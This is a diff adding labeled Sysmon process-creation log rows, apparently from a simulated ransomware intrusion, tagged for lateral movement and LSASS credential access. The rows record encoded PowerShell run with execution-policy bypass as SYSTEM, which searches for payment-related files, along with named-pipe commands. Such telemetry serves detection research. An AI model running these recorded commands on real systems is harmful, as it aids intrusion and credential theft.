+    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime=""2022-08-05T22:17:31.089885600Z""/>
+    <EventRecordID>210344</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID=""1440"" ThreadID=""1992""/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>ACC-01.corp.net</Computer>
+    <Security UserID=""S-1-5-18""/>
+  </System>
+  <EventData>
+    <Data Name=""RuleName""/>
+    <Data Name=""UtcTime"">2022-08-05 22:17:31.089</Data>
+    <Data Name=""ProcessGuid"">{62886613-96FB-62ED-0000-0010653BC901}</Data>
+    <Data Name=""ProcessId"">1572</Data>
+    <Data Name=""Image"">C:\Windows\SysWOW64\rundll32.exe</Data>
+    <Data Name=""FileVersion"">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
+    <Data Name=""Description"">Windows host process (Rundll32)</Data>
+    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
+    <Data Name=""Company"">Microsoft Corporation</Data>
+    <Data Name=""CommandLine"">C:\Windows\System32\rundll32.exe</Data>
+    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
+    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
+    <Data Name=""LogonGuid"">{62886613-6435-62ED-0000-0020E7030000}</Data>
+    <Data Name=""LogonId"">0x00000000000003e7</Data>
+    <Data Name=""TerminalSessionId"">0</Data>
+    <Data Name=""IntegrityLevel"">System</Data>
+    <Data Name=""Hashes"">MD5=51138BEEA3E2C21EC44D0932C71762A8,IMPHASH=EF8A44FE2F9AD4AB85E55004AAA024A9</Data>
+    <Data Name=""ParentProcessGuid"">{62886613-96FA-62ED-0000-0010B136C901}</Data>
+    <Data Name=""ParentProcessId"">2508</Data>
+    <Data Name=""ParentImage"">\\ACC-01\ADMIN$\b8a3848.exe</Data>
+    <Data Name=""ParentCommandLine"">\\ACC-01\ADMIN$\b8a3848.exe</Data>
+  </EventData>
+</Event>
+",1572,2508,C:\Windows\SysWOW64\rundll32.exe,\\ACC-01\ADMIN$\b8a3848.exe,C:\Windows\System32\rundll32.exe,NT AUTHORITY\SYSTEM,Sacrificial process (rundll32) spawned to move laterally,Lateral Movement
+2022-08-05 22:19:37+00:00,ACC-01,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
+  <System>
+    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime=""2022-08-05T22:19:37.726947900Z""/>
+    <EventRecordID>210971</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID=""1440"" ThreadID=""1992""/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>ACC-01.corp.net</Computer>
+    <Security UserID=""S-1-5-18""/>
+  </System>
+  <EventData>
+    <Data Name=""RuleName""/>
+    <Data Name=""UtcTime"">2022-08-05 22:19:37.725</Data>
+    <Data Name=""ProcessGuid"">{62886613-9779-62ED-0000-00106846CE01}</Data>
+    <Data Name=""ProcessId"">5884</Data>
+    <Data Name=""Image"">C:\Windows\System32\rundll32.exe</Data>
+    <Data Name=""FileVersion"">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
+    <Data Name=""Description"">Windows host process (Rundll32)</Data>
+    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
+    <Data Name=""Company"">Microsoft Corporation</Data>
+    <Data Name=""CommandLine"">C:\Windows\sysnative\rundll32.exe</Data>
+    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
+    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
+    <Data Name=""LogonGuid"">{62886613-6435-62ED-0000-0020E7030000}</Data>
+    <Data Name=""LogonId"">0x00000000000003e7</Data>
+    <Data Name=""TerminalSessionId"">0</Data>
+    <Data Name=""IntegrityLevel"">System</Data>
+    <Data Name=""Hashes"">MD5=DD81D91FF3B0763C392422865C9AC12E,IMPHASH=F8F47A970BADB255F8249475E7FBEABB</Data>
+    <Data Name=""ParentProcessGuid"">{62886613-96FB-62ED-0000-0010653BC901}</Data>
+    <Data Name=""ParentProcessId"">1572</Data>
+    <Data Name=""ParentImage"">C:\Windows\SysWOW64\rundll32.exe</Data>
+    <Data Name=""ParentCommandLine"">C:\Windows\System32\rundll32.exe</Data>
+  </EventData>
+</Event>
+",5884,1572,C:\Windows\System32\rundll32.exe,C:\Windows\SysWOW64\rundll32.exe,C:\Windows\sysnative\rundll32.exe,NT AUTHORITY\SYSTEM,Sacrificial process (rundll32) spawned to access LSASS,Credential Access
+2022-08-05 22:19:38+00:00,ACC-01,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
+  <System>
+    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime=""2022-08-05T22:19:38.478878100Z""/>
+    <EventRecordID>210975</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID=""1440"" ThreadID=""1992""/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>ACC-01.corp.net</Computer>
+    <Security UserID=""S-1-5-18""/>
+  </System>
+  <EventData>
+    <Data Name=""RuleName""/>
+    <Data Name=""UtcTime"">2022-08-05 22:19:38.463</Data>
+    <Data Name=""ProcessGuid"">{62886613-977A-62ED-0000-0010F34ECE01}</Data>
+    <Data Name=""ProcessId"">1284</Data>
+    <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
+    <Data Name=""FileVersion"">6.1.7601.17514 (win7sp1_rtm.101119-1850)</Data>
+    <Data Name=""Description"">Windows Command Processor</Data>
+    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
+    <Data Name=""Company"">Microsoft Corporation</Data>
+    <Data Name=""CommandLine"">C:\Windows\system32\cmd.exe /c echo 86420bf6b30 &gt; \\.\pipe\55bbda</Data>
+    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
+    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
+    <Data Name=""LogonGuid"">{62886613-977A-62ED-0000-00209C4ECE01}</Data>
+    <Data Name=""LogonId"">0x0000000001ce4e9c</Data>
+    <Data Name=""TerminalSessionId"">0</Data>
+    <Data Name=""IntegrityLevel"">System</Data>
+    <Data Name=""Hashes"">MD5=5746BD7E255DD6A8AFA06F7C42C1BA41,IMPHASH=D0058544E4588B1B2290B7F4D830EB0A</Data>
+    <Data Name=""ParentProcessGuid"">{62886613-9779-62ED-0000-00106846CE01}</Data>
+    <Data Name=""ParentProcessId"">5884</Data>
+    <Data Name=""ParentImage"">C:\Windows\System32\rundll32.exe</Data>
+    <Data Name=""ParentCommandLine"">C:\Windows\sysnative\rundll32.exe</Data>
+  </EventData>
+</Event>
+",1284,5884,C:\Windows\System32\cmd.exe,C:\Windows\System32\rundll32.exe,C:\Windows\system32\cmd.exe /c echo 86420bf6b30 &gt; \\.\pipe\55bbda,NT AUTHORITY\SYSTEM,,
+2022-08-05 22:20:25+00:00,ACC-01,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
+  <System>
+    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime=""2022-08-05T22:20:25.567522800Z""/>
+    <EventRecordID>211098</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID=""1440"" ThreadID=""1992""/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>ACC-01.corp.net</Computer>
+    <Security UserID=""S-1-5-18""/>
+  </System>
+  <EventData>
+    <Data Name=""RuleName""/>
+    <Data Name=""UtcTime"">2022-08-05 22:20:25.536</Data>
+    <Data Name=""ProcessGuid"">{62886613-97A9-62ED-0000-00101974CF01}</Data>
+    <Data Name=""ProcessId"">212</Data>
+    <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name=""FileVersion"">10.0.14409.1005 (rs1_srvoob.161208-1155)</Data>
+    <Data Name=""Description"">Windows PowerShell</Data>
+    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
+    <Data Name=""Company"">Microsoft Corporation</Data>
+    <Data Name=""CommandLine"">powershell -nop -exec bypass -EncodedCommand RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgAEMAOgBcACAALQBSAGUAYwB1AHIAcwBlACAALQBJAG4AYwBsAHUAZABlACAAKgBzAHcAaQBmAHQAKgA=</Data>
+    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
+    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
+    <Data Name=""LogonGuid"">{62886613-977A-62ED-0000-00209C4ECE01}</Data>
+    <Data Name=""LogonId"">0x0000000001ce4e9c</Data>
+    <Data Name=""TerminalSessionId"">0</Data>
+    <Data Name=""IntegrityLevel"">System</Data>
+    <Data Name=""Hashes"">MD5=A575A7610E5F003CC36DF39E07C4BA7D,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453</Data>
+    <Data Name=""ParentProcessGuid"">{62886613-96FB-62ED-0000-0010653BC901}</Data>
+    <Data Name=""ParentProcessId"">1572</Data>
+    <Data Name=""ParentImage"">C:\Windows\SysWOW64\rundll32.exe</Data>
+    <Data Name=""ParentCommandLine"">C:\Windows\System32\rundll32.exe</Data>
+  </EventData>
+</Event>
+",212,1572,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\SysWOW64\rundll32.exe,powershell -nop -exec bypass -EncodedCommand RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgAEMAOgBcACAALQBSAGUAYwB1AHIAcwBlACAALQBJAG4AYwBsAHUAZABlACAAKgBzAHcAaQBmAHQAKgA=,NT AUTHORITY\SYSTEM,,
+2022-08-05 22:21:32+00:00,ACC-01,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
+  <System>
+    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime=""2022-08-05T22:21:32.588691200Z""/>
+    <EventRecordID>211333</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID=""1440"" ThreadID=""1992""/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>ACC-01.corp.net</Computer>
+    <Security UserID=""S-1-5-18""/>
+  </System>
+  <EventData>
+    <Data Name=""RuleName""/>
+    <Data Name=""UtcTime"">2022-08-05 22:21:32.588</Data>
+    <Data Name=""ProcessGuid"">{62886613-97EC-62ED-0000-00102D6AD701}</Data>
+    <Data Name=""ProcessId"">1808</Data>
+    <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name=""FileVersion"">10.0.14409.1005 (rs1_srvoob.161208-1155)</Data>
+    <Data Name=""Description"">Windows PowerShell</Data>
+    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
+    <Data Name=""Company"">Microsoft Corporation</Data>
+    <Data Name=""CommandLine"">powershell -nop -exec bypass -EncodedCommand VABlAHMAdAAtAFAAYQB0AGgAIABDADoAXABBAEMASAA=</Data>
+    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
+    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
+    <Data Name=""LogonGuid"">{62886613-977A-62ED-0000-00209C4ECE01}</Data>
+    <Data Name=""LogonId"">0x0000000001ce4e9c</Data>
+    <Data Name=""TerminalSessionId"">0</Data>
+    <Data Name=""IntegrityLevel"">System</Data>
+    <Data Name=""Hashes"">MD5=A575A7610E5F003CC36DF39E07C4BA7D,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453</Data>
+    <Data Name=""ParentProcessGuid"">{62886613-96FB-62ED-0000-0010653BC901}</Data>
+    <Data Name=""ParentProcessId"">1572</Data>
+    <Data Name=""ParentImage"">C:\Windows\SysWOW64\rundll32.exe</Data>
+    <Data Name=""ParentCommandLine"">C:\Windows\System32\rundll32.exe</Data>
+  </EventData>
+</Event>
+",1808,1572,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\SysWOW64\rundll32.exe,powershell -nop -exec bypass -EncodedCommand VABlAHMAdAAtAFAAYQB0AGgAIABDADoAXABBAEMASAA=,NT AUTHORITY\SYSTEM,,
+2022-08-05 22:22:17+00:00,ACC-07,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
+  <System>
+    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime=""2022-08-05T22:22:17.726613900Z""/>
+    <EventRecordID>175831</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID=""1444"" ThreadID=""1932""/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>ACC-07.corp.net</Computer>
+    <Security UserID=""S-1-5-18""/>
+  </System>
+  <EventData>
+    <Data Name=""RuleName""/>
+    <Data Name=""UtcTime"">2022-08-05 22:22:17.711</Data>
+    <Data Name=""ProcessGuid"">{7A60D74F-9819-62ED-0000-00106853B001}</Data>
+    <Data Name=""ProcessId"">1488</Data>
+    <Data Name=""Image"">\\ACC-07\ADMIN$\4e6964b.exe</Data>
+    <Data Name=""FileVersion"">?</Data>
+    <Data Name=""Description"">?</Data>
+    <Data Name=""Product"">?</Data>
+    <Data Name=""Company"">?</Data>
+    <Data Name=""CommandLine"">\\ACC-07\ADMIN$\4e6964b.exe</Data>
+    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
+    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
+    <Data Name=""LogonGuid"">{7A60D74F-64C4-62ED-0000-0020E7030000}</Data>
+    <Data Name=""LogonId"">0x00000000000003e7</Data>
+    <Data Name=""TerminalSessionId"">0</Data>
+    <Data Name=""IntegrityLevel"">System</Data>
+    <Data Name=""Hashes"">MD5=C0C68E432CB9416B326DE705B4E582EC,IMPHASH=DE77F3139EAF74F1B255AB7BE0B6605F</Data>
+    <Data Name=""ParentProcessGuid"">{7A60D74F-64C3-62ED-0000-001004940000}</Data>
+    <Data Name=""ParentProcessId"">464</Data>
+    <Data Name=""ParentImage"">C:\Windows\System32\services.exe</Data>
+    <Data Name=""ParentCommandLine"">C:\Windows\system32\services.exe</Data>
+  </EventData>
+</Event>
+",1488,464,\\ACC-07\ADMIN$\4e6964b.exe,C:\Windows\System32\services.exe,\\ACC-07\ADMIN$\4e6964b.exe,NT AUTHORITY\SYSTEM,,
+2022-08-05 22:22:18+00:00,ACC-07,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
+  <System>
+    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime=""2022-08-05T22:22:18.801817400Z""/>
+    <EventRecordID>175843</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID=""1444"" ThreadID=""1932""/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>ACC-07.corp.net</Computer>
+    <Security UserID=""S-1-5-18""/>
+  </System>
+  <EventData>
+    <Data Name=""RuleName""/>
+    <Data Name=""UtcTime"">2022-08-05 22:22:18.801</Data>
+    <Data Name=""ProcessGuid"">{7A60D74F-981A-62ED-0000-00105758B001}</Data>
+    <Data Name=""ProcessId"">3208</Data>
+    <Data Name=""Image"">C:\Windows\SysWOW64\rundll32.exe</Data>
+    <Data Name=""FileVersion"">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
+    <Data Name=""Description"">Windows host process (Rundll32)</Data>
+    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
+    <Data Name=""Company"">Microsoft Corporation</Data>
+    <Data Name=""CommandLine"">C:\Windows\System32\rundll32.exe</Data>
+    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
+    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
+    <Data Name=""LogonGuid"">{7A60D74F-64C4-62ED-0000-0020E7030000}</Data>
+    <Data Name=""LogonId"">0x00000000000003e7</Data>
+    <Data Name=""TerminalSessionId"">0</Data>
+    <Data Name=""IntegrityLevel"">System</Data>
+    <Data Name=""Hashes"">MD5=51138BEEA3E2C21EC44D0932C71762A8,IMPHASH=EF8A44FE2F9AD4AB85E55004AAA024A9</Data>
+    <Data Name=""ParentProcessGuid"">{7A60D74F-9819-62ED-0000-00106853B001}</Data>
+    <Data Name=""ParentProcessId"">1488</Data>
+    <Data Name=""ParentImage"">\\ACC-07\ADMIN$\4e6964b.exe</Data>
+    <Data Name=""ParentCommandLine"">\\ACC-07\ADMIN$\4e6964b.exe</Data>
+  </EventData>
+</Event>
+",3208,1488,C:\Windows\SysWOW64\rundll32.exe,\\ACC-07\ADMIN$\4e6964b.exe,C:\Windows\System32\rundll32.exe,NT AUTHORITY\SYSTEM,Sacrificial process (rundll32) spawned to move laterally+ Expose TCP 59886 to download the ransomware,Lateral Movement
+2022-08-05 22:23:45+00:00,ACC-07,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
+  <System>
+    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime=""2022-08-05T22:23:45.174872400Z""/>
+    <EventRecordID>176014</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID=""1444"" ThreadID=""1932""/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>ACC-07.corp.net</Computer>
+    <Security UserID=""S-1-5-18""/>
+  </System>
+  <EventData>
+    <Data Name=""RuleName""/>
+    <Data Name=""UtcTime"">2022-08-05 22:23:45.159</Data>
+    <Data Name=""ProcessGuid"">{7A60D74F-9871-62ED-0000-00103FD1B001}</Data>
+    <Data Name=""ProcessId"">3460</Data>
+    <Data Name=""Image"">C:\Windows\System32\rundll32.exe</Data>
+    <Data Name=""FileVersion"">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
+    <Data Name=""Description"">Windows host process (Rundll32)</Data>
+    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
+    <Data Name=""Company"">Microsoft Corporation</Data>
+    <Data Name=""CommandLine"">C:\Windows\sysnative\rundll32.exe</Data>
+    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
+    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
+    <Data Name=""LogonGuid"">{7A60D74F-64C4-62ED-0000-0020E7030000}</Data>
+    <Data Name=""LogonId"">0x00000000000003e7</Data>
+    <Data Name=""TerminalSessionId"">0</Data>
+    <Data Name=""IntegrityLevel"">System</Data>
+    <Data Name=""Hashes"">MD5=DD81D91FF3B0763C392422865C9AC12E,IMPHASH=F8F47A970BADB255F8249475E7FBEABB</Data>
+    <Data Name=""ParentProcessGuid"">{7A60D74F-981A-62ED-0000-00105758B001}</Data>
+    <Data Name=""ParentProcessId"">3208</Data>
+    <Data Name=""ParentImage"">C:\Windows\SysWOW64\rundll32.exe</Data>
+    <Data Name=""ParentCommandLine"">C:\Windows\System32\rundll32.exe</Data>
+  </EventData>
+</Event>
+",3460,3208,C:\Windows\System32\rundll32.exe,C:\Windows\SysWOW64\rundll32.exe,C:\Windows\sysnative\rundll32.exe,NT AUTHORITY\SYSTEM,Sacrificial process (rundll32) spawned to access LSASS,Credential Access
+2022-08-05 22:23:45+00:00,ACC-07,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
+  <System>
+    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime=""2022-08-05T22:23:45.938476300Z""/>
+    <EventRecordID>176018</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID=""1444"" ThreadID=""1932""/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>ACC-07.corp.net</Computer>
+    <Security UserID=""S-1-5-18""/>
+  </System>
+  <EventData>
+    <Data Name=""RuleName""/>
+    <Data Name=""UtcTime"">2022-08-05 22:23:45.906</Data>
+    <Data Name=""ProcessGuid"">{7A60D74F-9871-62ED-0000-001000DAB001}</Data>
+    <Data Name=""ProcessId"">5000</Data>
+    <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
+    <Data Name=""FileVersion"">6.1.7601.17514 (win7sp1_rtm.101119-1850)</Data>
+    <Data Name=""Description"">Windows Command Processor</Data>
+    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
+    <Data Name=""Company"">Microsoft Corporation</Data>
+    <Data Name=""CommandLine"">C:\Windows\system32\cmd.exe /c echo 8b6f83f777a &gt; \\.\pipe\cef512</Data>
+    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
+    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
+    <Data Name=""LogonGuid"">{7A60D74F-9871-62ED-0000-00207BD9B001}</Data>
+    <Data Name=""LogonId"">0x0000000001b0d97b</Data>
+    <Data Name=""TerminalSessionId"">0</Data>
+    <Data Name=""IntegrityLevel"">System</Data>
+    <Data Name=""Hashes"">MD5=5746BD7E255DD6A8AFA06F7C42C1BA41,IMPHASH=D0058544E4588B1B2290B7F4D830EB0A</Data>
+    <Data Name=""ParentProcessGuid"">{7A60D74F-9871-62ED-0000-00103FD1B001}</Data>
+    <Data Name=""ParentProcessId"">3460</Data>
+    <Data Name=""ParentImage"">C:\Windows\System32\rundll32.exe</Data>
+    <Data Name=""ParentCommandLine"">C:\Windows\sysnative\rundll32.exe</Data>
+  </EventData>
+</Event>
+",5000,3460,C:\Windows\System32\cmd.exe,C:\Windows\System32\rundll32.exe,C:\Windows\system32\cmd.exe /c echo 8b6f83f777a &gt; \\.\pipe\cef512,NT AUTHORITY\SYSTEM,,
+2022-08-05 22:24:41+00:00,ACC-07,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
+  <System>
+    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime=""2022-08-05T22:24:41.851743100Z""/>
+    <EventRecordID>176204</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID=""1444"" ThreadID=""1932""/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>ACC-07.corp.net</Computer>
+    <Security UserID=""S-1-5-18""/>
+  </System>
+  <EventData>
+    <Data Name=""RuleName""/>
+    <Data Name=""UtcTime"">2022-08-05 22:24:41.230</Data>
+    <Data Name=""ProcessGuid"">{7A60D74F-98A9-62ED-0000-0010F6C3B101}</Data>
+    <Data Name=""ProcessId"">3744</Data>
+    <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name=""FileVersion"">10.0.14409.1005 (rs1_srvoob.161208-1155)</Data>
+    <Data Name=""Description"">Windows PowerShell</Data>
+    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
+    <Data Name=""Company"">Microsoft Corporation</Data>
+    <Data Name=""CommandLine"">powershell -nop -exec bypass -EncodedCommand RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgAEMAOgBcACAALQBSAGUAYwB1AHIAcwBlACAALQBJAG4AYwBsAHUAZABlACAAKgBzAHcAaQBmAHQAKgA=</Data>
+    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
+    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
+    <Data Name=""LogonGuid"">{7A60D74F-9871-62ED-0000-00207BD9B001}</Data>
+    <Data Name=""LogonId"">0x0000000001b0d97b</Data>
+    <Data Name=""TerminalSessionId"">0</Data>
+    <Data Name=""IntegrityLevel"">System</Data>
+    <Data Name=""Hashes"">MD5=A575A7610E5F003CC36DF39E07C4BA7D,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453</Data>
+    <Data Name=""ParentProcessGuid"">{7A60D74F-981A-62ED-0000-00105758B001}</Data>
+    <Data Name=""ParentProcessId"">3208</Data>
+    <Data Name=""ParentImage"">C:\Windows\SysWOW64\rundll32.exe</Data>
+    <Data Name=""ParentCommandLine"">C:\Windows\System32\rundll32.exe</Data>
+  </EventData>
+</Event>
+",3744,3208,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\SysWOW64\rundll32.exe,powershell -nop -exec bypass -EncodedCommand RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgAEMAOgBcACAALQBSAGUAYwB1AHIAcwBlACAALQBJAG4AYwBsAHUAZABlACAAKgBzAHcAaQBmAHQAKgA=,NT AUTHORITY\SYSTEM,,
+2022-08-05 22:25:33+00:00,ACC-07,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
+  <System>
+    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime=""2022-08-05T22:25:33.475373000Z""/>
+    <EventRecordID>176354</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID=""1444"" ThreadID=""1932""/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>ACC-07.corp.net</Computer>
+    <Security UserID=""S-1-5-18""/>
+  </System>
+  <EventData>
+    <Data Name=""RuleName""/>
+    <Data Name=""UtcTime"">2022-08-05 22:25:33.008</Data>
+    <Data Name=""ProcessGuid"">{7A60D74F-98DD-62ED-0000-00108A1BB901}</Data>
+    <Data Name=""ProcessId"">4740</Data>
+    <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name=""FileVersion"">10.0.14409.1005 (rs1_srvoob.161208-1155)</Data>
+    <Data Name=""Description"">Windows PowerShell</Data>
+    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
+    <Data Name=""Company"">Microsoft Corporation</Data>
+    <Data Name=""CommandLine"">powershell -nop -exec bypass -EncodedCommand VABlAHMAdAAtAFAAYQB0AGgAIABDADoAXABBAEMASAA=</Data>
+    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
+    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
+    <Data Name=""LogonGuid"">{7A60D74F-9871-62ED-0000-00207BD9B001}</Data>
+    <Data Name=""LogonId"">0x0000000001b0d97b</Data>
+    <Data Name=""TerminalSessionId"">0</Data>
+    <Data Name=""IntegrityLevel"">System</Data>
+    <Data Name=""Hashes"">MD5=A575A7610E5F003CC36DF39E07C4BA7D,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453</Data>
+    <Data Name=""ParentProcessGuid"">{7A60D74F-981A-62ED-0000-00105758B001}</Data>
+    <Data Name=""ParentProcessId"">3208</Data>
+    <Data Name=""ParentImage"">C:\Windows\SysWOW64\rundll32.exe</Data>
+    <Data Name=""ParentCommandLine"">C:\Windows\System32\rundll32.exe</Data>
+  </EventData>
+</Event>
+",4740,3208,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\SysWOW64\rundll32.exe,powershell -nop -exec bypass -EncodedCommand VABlAHMAdAAtAFAAYQB0AGgAIABDADoAXABBAEMASAA=,NT AUTHORITY\SYSTEM,,
+2022-08-05 22:26:26+00:00,ACC-04,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
+  <System>
+    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
+    <EventID>1</EventID>
